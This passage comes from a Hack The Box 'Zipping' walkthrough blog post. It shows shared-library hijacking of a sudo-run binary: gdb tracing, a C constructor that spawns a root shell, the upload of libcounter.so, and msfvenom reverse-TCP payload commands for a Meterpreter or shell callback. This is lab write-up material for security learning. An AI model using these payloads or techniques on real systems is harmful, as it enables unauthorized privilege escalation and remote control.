+</span></span><span class="line"><span class="cl">Breakpoint <span class="m">2</span> at 0x5555555553de
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info b
+</span></span><span class="line"><span class="cl">Num     Type           Disp Enb Address            What
+</span></span><span class="line"><span class="cl"><span class="m">2</span>       breakpoint     keep y   0x00005555555553de &lt;main+292&gt;
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r
+</span></span><span class="line"><span class="cl">The program being debugged has been started already.
+</span></span><span class="line"><span class="cl">Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
+</span></span><span class="line"><span class="cl">Starting program: /home/kali/HTB/Zipping/loot/stock
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Thread debugging using libthread_db enabled<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Using host libthread_db library <span class="s2">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
+</span></span><span class="line"><span class="cl">Enter the password: St0ckM4nager
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Breakpoint 2, 0x00005555555553de in main <span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info registers
+</span></span><span class="line"><span class="cl">rax            0x7fffffffd400      <span class="m">140737488344064</span>
+</span></span><span class="line"><span class="cl">rbx            0x7fffffffd5f8      <span class="m">140737488344568</span>
+</span></span><span class="line"><span class="cl">rcx            0x7a                <span class="m">122</span>
+</span></span><span class="line"><span class="cl">rdx            0x6f                <span class="m">111</span>
+</span></span><span class="line"><span class="cl">rsi            0x1                 <span class="m">1</span>
+</span></span><span class="line"><span class="cl">rdi            0x7fffffffd400      <span class="m">140737488344064</span>
+</span></span><span class="line"><span class="cl">&lt;---snip---&gt;
+</span></span></code></pre></div><p>Now, when I step into the dltopen() function, I can see the arguments to it. Alternatively, I can also use the <code>examine/string</code> or <code>x/s</code> gdb command to dump the contents of the rdi register.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> step
+</span></span><span class="line"><span class="cl">Single stepping <span class="k">until</span> <span class="nb">exit</span> from <span class="k">function</span> main,
+</span></span><span class="line"><span class="cl">which has no line number information.
+</span></span><span class="line"><span class="cl">___dlopen <span class="o">(</span><span class="nv">file</span><span class="o">=</span>0x7fffffffd400 <span class="s2">&#34;/home/rektsu/.config/libcounter.so&#34;</span>, <span class="nv">mode</span><span class="o">=</span>1<span class="o">)</span> at ./dlfcn/dlopen.c:77
+</span></span><span class="line"><span class="cl"><span class="m">77</span>  ./dlfcn/dlopen.c: No such file or directory.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/s <span class="nv">$rdi</span>
+</span></span><span class="line"><span class="cl">0x7fffffffd400: <span class="s2">&#34;/home/rektsu/.config/libcounter.so&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> c
+</span></span><span class="line"><span class="cl">Continuing.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">==================</span> <span class="nv">Menu</span> <span class="o">==================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1<span class="o">)</span> See the stock
+</span></span><span class="line"><span class="cl">2<span class="o">)</span> Edit the stock
+</span></span><span class="line"><span class="cl">3<span class="o">)</span> Exit the program
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Select an option:
+</span></span></code></pre></div><p>This means the <code>/home/rektsu/.config/libcounter.so</code> library is dynamically linked password after entering the password.</p>
+<h3 id="shared-library-object-exploit" class="relative group">Shared library object exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#shared-library-object-exploit" aria-label="Anchor">#</a></span></h3><p>I found a <a href="https://tbhaxor.com/exploiting-shared-library-misconfigurations/" target="_blank" rel="noreferrer">blog post</a> that explained how to exploit shared library injection.</p>
+<p><em>exploit.c</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">exploit</span><span class="p">()</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">exploit</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash -p&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <code>__attribute__((constructor))</code> attribute ensures that the <code>exploit()</code> function will be automatically called when the shared library is loaded, before the <code>main()</code> of <code>stock</code> is executed.</p>
+<p>Compiling the exploit as a shared library</p>
+<ul>
+<li><code>-shared</code> tells the gcc compiler to create a shared library</li>
+<li><code>-fPIC</code> generates Position Independent Code . <em>This is required because the shared object should be able to be loaded and executed at any memory address</em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; gcc -shared -o libcounter.so -fPIC exploit.c
+</span></span><span class="line"><span class="cl">&gt; l
+</span></span><span class="line"><span class="cl">Permissions Size User Date Modified Name
+</span></span><span class="line"><span class="cl">.rw-r--r--   <span class="m">130</span> kali  <span class="m">2</span> Sep 01:12  exploit.c
+</span></span><span class="line"><span class="cl">.rwxr-xr-x   15k kali  <span class="m">2</span> Sep 01:12  libcounter.so
+</span></span></code></pre></div><p>Uploaded the shared library to the required location on the box and made it executable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> rektsu@zipping:/home/rektsu$
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$ upload ../exploit/root/libcounter.so .config/libcounter.so
+</span></span><span class="line"><span class="cl">.config/libcounter.so ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 15.4/15.4 KB • ? • 0:00:00
+</span></span><span class="line"><span class="cl"><span class="o">[</span>01:32:39<span class="o">]</span> uploaded 15.43KiB in 0.94 seconds                                                           upload.py:76
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> rektsu@zipping:/home/rektsu$ chmod +x .config/libcounter.so
+</span></span></code></pre></div><p>Now, by executing the binary as root and supplying the valid password, it triggers the <code>bash -p</code> from the exploit code, granting a shell with root privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> rektsu@zipping:/home/rektsu$ sudo /usr/bin/stock
+</span></span><span class="line"><span class="cl">Enter the password: St0ckM4nager
+</span></span><span class="line"><span class="cl">root@zipping:/home/rektsu# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@zipping:/home/rektsu# <span class="nb">cd</span>
+</span></span><span class="line"><span class="cl">root@zipping:~# ls -l root.txt
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root root <span class="m">33</span> Sep  <span class="m">1</span> 11:10 root.txt
+</span></span></code></pre></div><p>Another option is to use msfvenom to build the malicious shared object.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.42 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f elf-so -o libcounter.so
+</span></span><span class="line"><span class="cl">msfvenom -p linux/x64/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.42 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f elf-so -o libcounter.so
+</span></span></code></pre></div><p><strong>Pwned</strong></p>
+<!-- ![Pwned](./images/Pwned.png) -->
+<hr>
+<h1 id="related-links" class="relative group">Related Links <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#related-links" aria-label="Anchor">#</a></span></h1><ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload" target="_blank" rel="noreferrer">File Upload - HackTricks</a></li>
+<li><a href="https://www.acunetix.com/vulnerabilities/web/arbitrary-local-file-read-via-file-upload/" target="_blank" rel="noreferrer">Arbitrary local file read via file upload - Vulnerabilities - Acunetix</a></li>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#new-line-bypass" target="_blank" rel="noreferrer">PHP Tricks - HackTricks</a></li>
+<li><a href="https://stackoverflow.com/questions/6346674/pdo-support-for-multiple-queries-pdo-mysql-pdo-mysqlnd" target="_blank" rel="noreferrer">php - PDO support for multiple queries (PDO_MYSQL, PDO_MYSQLND) - Stack Overflow</a></li>
+<li><a href="https://blog.ulf-wendel.de/2008/pdo_mysqlnd-insecure-multi-statements-and-pdostatementnextrowset/" target="_blank" rel="noreferrer">PDO_MYSQLND: Mighty multiple-queries and PDOStatement - Ulf Wendel</a></li>
+<li><a href="https://mariadb.com/kb/en/select-into-outfile/" target="_blank" rel="noreferrer">SELECT INTO OUTFILE - MariaDB Knowledge Base</a></li>
+<li><a href="https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2" target="_blank" rel="noreferrer">Abusing missing libraries for Privilege Escalation | by Nishant Sharma | Pentester Academy Blog</a></li>
+<li><a href="https://tbhaxor.com/exploiting-shared-library-misconfigurations/" target="_blank" rel="noreferrer">Exploiting Shared Library Misconfigurations</a></li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+
+      
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://twitter.com/intent/tweet/?url=//localhost:1313/blog/htb-zipping/&amp;text=HTB%20Zipping"
+          title="Tweet on Twitter"
+          aria-label="Tweet on Twitter"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/blog/htb-zipping/&amp;title=HTB%20Zipping"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=//localhost:1313/blog/htb-zipping/&amp;resubmit=true&amp;title=HTB%20Zipping"
+          title="Submit to Reddit"
+          aria-label="Submit to Reddit"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span></a
+        >
+      
+    
+  </section>
+
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/htb-sau/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Sau</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-01-10 13:59:44 &#43;0530 IST">10 January 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/cve-2024-23897/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Jenkins CVE-2024-23897</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-02-04 21:14:31 &#43;0530 IST">4 February 2024</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+        
+          <div class="pt-3">
+            <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+            <div class="pt-3">
+              <script
+    src="https://giscus.app/client.js"
+    data-repo="AbraXa5/personal-blog"
+    data-repo-id="R_kgDOJxB9Aw"
+    data-category="Q&A"
+    data-category-id="DIC_kwDOJxB9A84CXU6d"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="dark_dimmed"
+    data-lang="en"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    async
+></script>
+
+            </div>
+          </div>
+        
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex list-none flex-col sm:flex-row">
+        
+          
+          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
+            
+              <a
+                href="https://www.buymeacoffee.com/abr4xa5"
+                title=""
+                target="_blank"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                  ><span class="icon relative inline-block px-1 align-text-bottom"><svg width="884" height="1279" viewBox="0 0 884 1279" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M791.109 297.518L790.231 297.002L788.201 296.383C789.018 297.072 790.04 297.472 791.109 297.518V297.518Z"
+        fill="#0D0C22" />
+    <path d="M803.896 388.891L802.916 389.166L803.896 388.891Z" fill="#0D0C22" />
+    <path
+        d="M791.484 297.377C791.359 297.361 791.237 297.332 791.118 297.29C791.111 297.371 791.111 297.453 791.118 297.534C791.252 297.516 791.379 297.462 791.484 297.377V297.377Z"
+        fill="#0D0C22" />
+    <path d="M791.113 297.529H791.244V297.447L791.113 297.529Z" fill="#0D0C22" />
+    <path
+        d="M803.111 388.726L804.591 387.883L805.142 387.573L805.641 387.04C804.702 387.444 803.846 388.016 803.111 388.726V388.726Z"
+        fill="#0D0C22" />
+    <path d="M793.669 299.515L792.223 298.138L791.243 297.605C791.77 298.535 792.641 299.221 793.669 299.515V299.515Z"
+        fill="#0D0C22" />
+    <path
+        d="M430.019 1186.18C428.864 1186.68 427.852 1187.46 427.076 1188.45L427.988 1187.87C428.608 1187.3 429.485 1186.63 430.019 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M641.187 1144.63C641.187 1143.33 640.551 1143.57 640.705 1148.21C640.705 1147.84 640.86 1147.46 640.929 1147.1C641.015 1146.27 641.084 1145.46 641.187 1144.63Z"
+        fill="#0D0C22" />
+    <path
+        d="M619.284 1186.18C618.129 1186.68 617.118 1187.46 616.342 1188.45L617.254 1187.87C617.873 1187.3 618.751 1186.63 619.284 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M281.304 1196.06C280.427 1195.3 279.354 1194.8 278.207 1194.61C279.136 1195.06 280.065 1195.51 280.684 1195.85L281.304 1196.06Z"
+        fill="#0D0C22" />
+    <path
+        d="M247.841 1164.01C247.704 1162.66 247.288 1161.35 246.619 1160.16C247.093 1161.39 247.489 1162.66 247.806 1163.94L247.841 1164.01Z"
+        fill="#0D0C22" />
+    <path
+        d="M472.623 590.836C426.682 610.503 374.546 632.802 306.976 632.802C278.71 632.746 250.58 628.868 223.353 621.274L270.086 1101.08C271.74 1121.13 280.876 1139.83 295.679 1153.46C310.482 1167.09 329.87 1174.65 349.992 1174.65C349.992 1174.65 416.254 1178.09 438.365 1178.09C462.161 1178.09 533.516 1174.65 533.516 1174.65C553.636 1174.65 573.019 1167.08 587.819 1153.45C602.619 1139.82 611.752 1121.13 613.406 1101.08L663.459 570.876C641.091 563.237 618.516 558.161 593.068 558.161C549.054 558.144 513.591 573.303 472.623 590.836Z"
+        fill="#FFDD00" />
+    <path d="M78.6885 386.132L79.4799 386.872L79.9962 387.182C79.5987 386.787 79.1603 386.435 78.6885 386.132V386.132Z"
+        fill="#0D0C22" />
+    <path
+        d="M879.567 341.849L872.53 306.352C866.215 274.503 851.882 244.409 819.19 232.898C808.711 229.215 796.821 227.633 788.786 220.01C780.751 212.388 778.376 200.55 776.518 189.572C773.076 169.423 769.842 149.257 766.314 129.143C763.269 111.85 760.86 92.4243 752.928 76.56C742.604 55.2584 721.182 42.8009 699.88 34.559C688.965 30.4844 677.826 27.0375 666.517 24.2352C613.297 10.1947 557.342 5.03277 502.591 2.09047C436.875 -1.53577 370.983 -0.443234 305.422 5.35968C256.625 9.79894 205.229 15.1674 158.858 32.0469C141.91 38.224 124.445 45.6399 111.558 58.7341C95.7448 74.8221 90.5829 99.7026 102.128 119.765C110.336 134.012 124.239 144.078 138.985 150.737C158.192 159.317 178.251 165.846 198.829 170.215C256.126 182.879 315.471 187.851 374.007 189.968C438.887 192.586 503.87 190.464 568.44 183.618C584.408 181.863 600.347 179.758 616.257 177.304C634.995 174.43 647.022 149.928 641.499 132.859C634.891 112.453 617.134 104.538 597.055 107.618C594.095 108.082 591.153 108.512 588.193 108.942L586.06 109.252C579.257 110.113 572.455 110.915 565.653 111.661C551.601 113.175 537.515 114.414 523.394 115.378C491.768 117.58 460.057 118.595 428.363 118.647C397.219 118.647 366.058 117.769 334.983 115.722C320.805 114.793 306.661 113.611 292.552 112.177C286.134 111.506 279.733 110.801 273.333 110.009L267.241 109.235L265.917 109.046L259.602 108.134C246.697 106.189 233.792 103.953 221.025 101.251C219.737 100.965 218.584 100.249 217.758 99.2193C216.932 98.1901 216.482 96.9099 216.482 95.5903C216.482 94.2706 216.932 92.9904 217.758 91.9612C218.584 90.9319 219.737 90.2152 221.025 89.9293H221.266C232.33 87.5721 243.479 85.5589 254.663 83.8038C258.392 83.2188 262.131 82.6453 265.882 82.0832H265.985C272.988 81.6186 280.026 80.3625 286.994 79.5366C347.624 73.2302 408.614 71.0801 469.538 73.1014C499.115 73.9618 528.676 75.6996 558.116 78.6935C564.448 79.3474 570.746 80.0357 577.043 80.8099C579.452 81.1025 581.878 81.4465 584.305 81.7391L589.191 82.4445C603.438 84.5667 617.61 87.1419 631.708 90.1703C652.597 94.7128 679.422 96.1925 688.713 119.077C691.673 126.338 693.015 134.408 694.649 142.03L696.731 151.752C696.786 151.926 696.826 152.105 696.852 152.285C701.773 175.227 706.7 198.169 711.632 221.111C711.994 222.806 712.002 224.557 711.657 226.255C711.312 227.954 710.621 229.562 709.626 230.982C708.632 232.401 707.355 233.6 705.877 234.504C704.398 235.408 702.75 235.997 701.033 236.236H700.895L697.884 236.649L694.908 237.044C685.478 238.272 676.038 239.419 666.586 240.486C647.968 242.608 629.322 244.443 610.648 245.992C573.539 249.077 536.356 251.102 499.098 252.066C480.114 252.57 461.135 252.806 442.162 252.771C366.643 252.712 291.189 248.322 216.173 239.625C208.051 238.662 199.93 237.629 191.808 236.58C198.106 237.389 187.231 235.96 185.029 235.651C179.867 234.928 174.705 234.177 169.543 233.397C152.216 230.798 134.993 227.598 117.7 224.793C96.7944 221.352 76.8005 223.073 57.8906 233.397C42.3685 241.891 29.8055 254.916 21.8776 270.735C13.7217 287.597 11.2956 305.956 7.64786 324.075C4.00009 342.193 -1.67805 361.688 0.472751 380.288C5.10128 420.431 33.165 453.054 73.5313 460.35C111.506 467.232 149.687 472.807 187.971 477.556C338.361 495.975 490.294 498.178 641.155 484.129C653.44 482.982 665.708 481.732 677.959 480.378C681.786 479.958 685.658 480.398 689.292 481.668C692.926 482.938 696.23 485.005 698.962 487.717C701.694 490.429 703.784 493.718 705.08 497.342C706.377 500.967 706.846 504.836 706.453 508.665L702.633 545.797C694.936 620.828 687.239 695.854 679.542 770.874C671.513 849.657 663.431 928.434 655.298 1007.2C653.004 1029.39 650.71 1051.57 648.416 1073.74C646.213 1095.58 645.904 1118.1 641.757 1139.68C635.218 1173.61 612.248 1194.45 578.73 1202.07C548.022 1209.06 516.652 1212.73 485.161 1213.01C450.249 1213.2 415.355 1211.65 380.443 1211.84C343.173 1212.05 297.525 1208.61 268.756 1180.87C243.479 1156.51 239.986 1118.36 236.545 1085.37C231.957 1041.7 227.409 998.039 222.9 954.381L197.607 711.615L181.244 554.538C180.968 551.94 180.693 549.376 180.435 546.76C178.473 528.023 165.207 509.681 144.301 510.627C126.407 511.418 106.069 526.629 108.168 546.76L120.298 663.214L145.385 904.104C152.532 972.528 159.661 1040.96 166.773 1109.41C168.15 1122.52 169.44 1135.67 170.885 1148.78C178.749 1220.43 233.465 1259.04 301.224 1269.91C340.799 1276.28 381.337 1277.59 421.497 1278.24C472.979 1279.07 524.977 1281.05 575.615 1271.72C650.653 1257.95 706.952 1207.85 714.987 1130.13C717.282 1107.69 719.576 1085.25 721.87 1062.8C729.498 988.559 737.115 914.313 744.72 840.061L769.601 597.451L781.009 486.263C781.577 480.749 783.905 475.565 787.649 471.478C791.392 467.391 796.352 464.617 801.794 463.567C823.25 459.386 843.761 452.245 859.023 435.916C883.318 409.918 888.153 376.021 879.567 341.849ZM72.4301 365.835C72.757 365.68 72.1548 368.484 71.8967 369.792C71.8451 367.813 71.9483 366.058 72.4301 365.835ZM74.5121 381.94C74.6842 381.819 75.2003 382.508 75.7337 383.334C74.925 382.576 74.4089 382.009 74.4949 381.94H74.5121ZM76.5597 384.641C77.2996 385.897 77.6953 386.689 76.5597 384.641V384.641ZM80.672 387.979H80.7752C80.7752 388.1 80.9645 388.22 81.0333 388.341C80.9192 388.208 80.7925 388.087 80.6548 387.979H80.672ZM800.796 382.989C793.088 390.319 781.473 393.726 769.996 395.43C641.292 414.529 510.713 424.199 380.597 419.932C287.476 416.749 195.336 406.407 103.144 393.382C94.1102 392.109 84.3197 390.457 78.1082 383.798C66.4078 371.237 72.1548 345.944 75.2003 330.768C77.9878 316.865 83.3218 298.334 99.8572 296.355C125.667 293.327 155.64 304.218 181.175 308.09C211.917 312.781 242.774 316.538 273.745 319.36C405.925 331.405 540.325 329.529 671.92 311.91C695.905 308.686 719.805 304.941 743.619 300.674C764.835 296.871 788.356 289.731 801.175 311.703C809.967 326.673 811.137 346.701 809.778 363.615C809.359 370.984 806.139 377.915 800.779 382.989H800.796Z"
+        fill="#0D0C22" />
+</svg>
+</span></span><span
+                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                    >BuyMeACoffee</span
+                  >
+                </a
+              >
+            
+          </li>
+        
+      </ul>
+    </nav>
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            Abraxas
+        </p>
+      
+      
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+        <div
+          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        >
+          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
+            <div
+              class="flex h-12 w-12 items-center justify-center dark:hidden"
+              title="Switch to dark appearance"
+            >
